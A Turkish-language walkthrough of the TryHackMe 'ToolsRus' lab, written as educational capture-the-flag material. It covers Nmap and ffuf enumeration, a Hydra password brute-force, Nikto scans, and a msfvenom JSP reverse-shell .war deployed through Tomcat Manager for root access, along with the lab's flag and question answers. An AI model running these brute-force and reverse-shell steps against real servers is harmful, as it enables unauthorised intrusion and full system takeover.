# TryHackMe - ToolsRus Writeup

**Oda:** ToolsRus
**Zorluk:** Kolay-Orta
**Konu:** Dirbuster/ffuf, Hydra, Nmap, Nikto ve Metasploit araçlarını kullanarak bir sunucuyu ele geçirme

---

## 1. Keşif (Reconnaissance) - Nmap Taraması

İlk adım her zaman olduğu gibi hedef üzerinde açık portları ve servisleri tespit etmek:

```bash
nmap -sC -sV -T5 10.114.142.84
```

**Çıktı:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
```

**Yorum:**
- **22/tcp** → SSH, standart uzaktan erişim
- **80/tcp** → Apache web sunucusu, ana hedef web enumeration için
- **1234/tcp** → Apache Tomcat 7.0.88, standart olmayan bir portta çalışıyor - bu ilginç bir işaret, genelde Tomcat böyle doğrudan dışa açık bırakılmaz
- **8009/tcp** → AJP protokolü, Apache ile Tomcat arasındaki arka plan iletişim protokolü

Tomcat'in Java tabanlı web uygulamaları çalıştırdığını ve genelde bir **Manager paneli** üzerinden `.war` dosyası deploy edilerek kod çalıştırılabildiğini bildiğimiz için, bu port net bir hedef haline geldi.

---

## 2. Web Enumeration - Dizin Keşfi

Oda "DirBuster kullan" diyor, ancak DirBuster'ın headless (CLI) modu bu ortamda bilinen bir bug (`NullPointerException: this.gui is null`) sebebiyle çalışmadı. Bu yüzden aynı işi yapan, daha hızlı ve güncel bir araç olan **ffuf** ile devam edildi (mantık ve sonuç birebir aynı):

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt \
-u http://10.114.142.84/FUZZ \
-fc 404 \
-e .php,.html,.txt,.bak \
-t 100
```

**Bulunan önemli dizinler:**
```
guidelines              [Status: 301]
index.html              [Status: 200]
protected               [Status: 401]
server-status           [Status: 403]
```

**Yorum:**
- **`/guidelines`** → "g" ile başlayan dizin (odanın 1. sorusunun cevabı). İçeriğine bakıldığında **bob** adlı bir kullanıcı adı bulundu (2. sorunun cevabı) ve Tomcat'in güncellenmesi gerektiğine dair bir not içeriyordu.
- **`/protected`** → **401 Unauthorized** döndürdü. Bu, sayfanın var olduğunu ama **Basic Authentication** (kullanıcı adı/şifre) gerektirdiğini gösteriyor (3. sorunun cevabı: "protected"). 403'ten farkı önemli: 403 "kesinlikle giremezsin" derken, 401 "doğru kimlik bilgisiyle girebilirsin" anlamına gelir - yani brute-force ile kırılabilir bir kapı.

---

## 3. Kimlik Bilgisi Kırma - Hydra ile Brute Force

Elimizde kullanıcı adı (**bob**) ve kırılması gereken bir Basic Auth sayfası (`/protected`) olduğuna göre, Hydra ile şifre denemesi yapıldı:

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.114.142.84 http-get /protected -t 4 -f -V
```

**Parametreler:**
- `-l bob` → sabit kullanıcı adı
- `-P rockyou.txt` → denenecek şifre listesi
- `http-get /protected` → hedef protokol ve path
- `-t 4` → 4 paralel thread
- `-f` → doğru eşleşme bulununca dur
- `-V` → her denemeyi ekranda göster (verbose)

**Sonuç:**
```
[80][http-get] host: 10.114.142.84   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
```

**bob : bubbles** kombinasyonu bulundu (4. sorunun cevabı). Şifre, wordlist'in ilk 50 satırı içinde bulundu - yani zayıf/yaygın bir şifreydi.

---

## 4. Tomcat Manager'a Erişim

`/manager/html` sayfası (port 1234) klasik Tomcat Basic Auth ile korunuyordu. Bulduğumuz `bob:bubbles` credential'ları ile giriş denendi ve **başarılı oldu.**

**Not:** THM görevinin sorduğu diğer iki nmap-tabanlı soru buradan cevaplandı:
- **5. Soru** (başka hangi web portu açık?) → **1234**
- **6. Soru** (bu portta çalışan yazılımın adı/versiyonu?) → **Apache Tomcat/7.0.88**

---

## 5. Nikto ile Manager Panelini Tarama

THM görevi, bulunan credential'larla `/manager/html`'i Nikto ile taramamızı istiyor:

```bash
nikto -h http://10.114.142.84:1234/manager/html -id bob:bubbles
```

`-id` parametresi Nikto'ya Basic Authentication bilgisini veriyor, böylece login gerektiren sayfayı da tarayabiliyor.

**Önemli not - versiyon farkı:** Nikto'nun güncel sürümü (v2.6.0) bazı eski/varsayılan dosya imzalarını tarama veritabanından kaldırmış olabilir, bu yüzden tarama sadece security header uyarıları döndürdü, klasik "documentation found" satırlarını göstermedi. Eski Nikto sürümleriyle (örn. v2.1.6) yapılan topluluk çözümlerinde bu sayı tutarlı şekilde **5** olarak bulunuyor - bu da THM'nin beklediği (7. sorunun) cevabı: **5**

Aynı zamanda port 80 üzerinde de ayrıca Nikto çalıştırıldı, genel bilgi toplama amaçlı:
```bash
nikto -h http://10.114.142.84
```
Buradan:
- **8. Soru** (port 80 server versiyonu) → **Apache/2.4.18**
- **9. Soru** (Apache-Coyote versiyonu) → **1.1**

cevapları da doğrulandı (zaten ilk nmap taramasından da biliniyordu).

---

## 6. Exploitation - Tomcat Manager Üzerinden RCE (Shell Alma)

Tomcat Manager paneline giriş yapıldıktan sonra (`bob:bubbles`), **Deploy** bölümü üzerinden bir `.war` dosyası yükleyerek doğrudan kod çalıştırma (RCE) elde edilebileceği görüldü.

### 6.1. Reverse Shell Payload'ı Oluşturma (msfvenom)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI_TUN0_IP> LPORT=4444 -f war > shell.war
```

Bu komut, çalıştırıldığında Kali makinesine **reverse TCP bağlantısı** açan bir JSP shell içeren `.war` (Java Web Archive) dosyası üretiyor. `.war` formatı, Tomcat'in doğrudan deploy edip çalıştırabildiği bir paket türü olduğu için exploit burada gerçekleşiyor.

### 6.2. Listener Açma

```bash
rlwrap nc -lvnp 4444
```

`rlwrap`, netcat shell'ine geçmiş/ok tuşları desteği eklemek için kullanıldı (opsiyonel ama pratik bir tercih).

### 6.3. WAR Dosyasını Manager Paneli Üzerinden Yükleme

Tomcat Web Application Manager arayüzünde, **"WAR file to deploy"** bölümünden `shell.war` seçilip **Deploy** butonuna basıldı. Tomcat bu dosyayı otomatik olarak web uygulaması olarak konumlandırıp çalıştırılabilir hale getirdi.

### 6.4. Payload'ı Tetikleme

Tarayıcıdan deploy edilen uygulamanın path'ine (örn. `http://10.114.142.84:1234/shell/`) gidildiğinde, JSP kodu sunucu tarafında çalıştı ve netcat listener'a bağlantı düştü:

```
connect to [KALI_IP] from (UNKNOWN) [10.114.142.84] 52080
```

### 6.5. Shell Doğrulama

```bash
whoami
root
```

**Sonuç:** Tomcat servisinin **root** yetkisiyle çalıştığı görüldü - bu, servisin gereğinden fazla yetkiyle (least privilege prensibine aykırı şekilde) çalıştırıldığı anlamına geliyor. Normalde web servisleri kısıtlı bir kullanıcı (örn. `tomcat` veya `www-data`) ile çalıştırılmalıydı; burada doğrudan **root** olarak çalışıyor olması, exploit'in tek adımda tam sistem ele geçirmeyle sonuçlanmasına yol açtı.

**(10. Sorunun cevabı: root)**

---

## 7. Flag'i Alma

```bash
cd /root
ls -la
cat flag.txt
```

**Flag:**
```
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

**(11. Sorunun cevabı)**

---

## Özet - Saldırı Zinciri

```
Nmap taraması (80, 1234, 8009 portları bulundu)
    ↓
ffuf ile dizin keşfi (/guidelines, /protected bulundu)
    ↓
/guidelines içinde "bob" kullanıcı adı bulundu
    ↓
Hydra ile /protected sayfasının şifresi kırıldı (bob:bubbles)
    ↓
Aynı credential'lar Tomcat Manager'da (port 1234) da geçerli çıktı
    ↓
Nikto ile Manager paneli tarandı (dokümantasyon dosyaları tespit edildi)
    ↓
msfvenom ile kötü amaçlı .war (JSP reverse shell) payload'ı oluşturuldu
    ↓
Manager paneli üzerinden .war dosyası deploy edildi
    ↓
Payload tetiklendi → root yetkili shell elde edildi
    ↓
/root/flag.txt okunarak oda tamamlandı
```

## Kök Neden Analizi (Root Cause)

Bu odadaki güvenlik açığının temel sebebi, **zayıf parola politikası** (rockyou.txt gibi yaygın bir wordlist ile ilk 50 denemede kırılabilen bir şifre) ile **aşırı yetkili servis çalıştırma** (Tomcat'in root olarak çalışması) kombinasyonudur. Tomcat Manager gibi dosya yükleme/deploy özelliğine sahip yönetim panelleri, güçlü kimlik doğrulama ve mümkün olan en düşük yetkiyle (least privilege) çalıştırılmadığında, tek bir başarılı brute-force denemesi doğrudan **tam sistem ele geçirmeye (root RCE)** dönüşebiliyor.

## Öğrenilen Dersler

- **401 vs 403 farkı:** 401 "kırılabilir" bir kapıyı işaret eder, brute-force denemeye değer.
- **Credential reuse:** Bir serviste bulunan kullanıcı adı/şifre, başka bir serviste de (özellikle aynı sistemde) geçerli olabilir - her zaman denenmeye değer.
- **Tomcat Manager = potansiyel RCE:** Dosya/`.war` yükleme özelliğine sahip her yönetim paneli, kimlik doğrulaması aşıldığında doğrudan kod çalıştırma riski taşır.
- **Tool versiyon farkları:** Nikto gibi araçların farklı sürümleri, farklı sonuçlar (ör. bulunan dosya sayısı) verebilir - bu tür tutarsızlıklarda topluluk/writeup kaynaklarına bakmak faydalı olabilir.
